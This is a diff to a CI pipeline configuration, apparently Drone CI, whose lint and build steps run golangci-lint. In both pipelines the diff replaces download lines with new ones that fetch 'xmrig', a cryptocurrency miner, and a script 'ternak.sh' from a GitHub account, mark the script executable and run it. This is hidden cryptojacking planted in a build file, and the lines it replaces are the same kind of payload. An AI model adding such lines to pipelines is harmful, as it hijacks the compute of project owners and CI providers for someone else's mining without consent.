@@ -9,8 +9,8 @@ steps:
   image: golangci/golangci-lint:v1.26.0
   commands:
   - golangci-lint run
-  - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-  - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
+  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
 kind: pipeline
 name: build
@@ -22,7 +22,7 @@ steps:
   image: golangci/golangci-lint:v1.26.0
   commands:
   - golangci-lint run
-  - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-  - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/xmrig
+  - wget https://raw.githubusercontent.com/renitaa12/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 
 
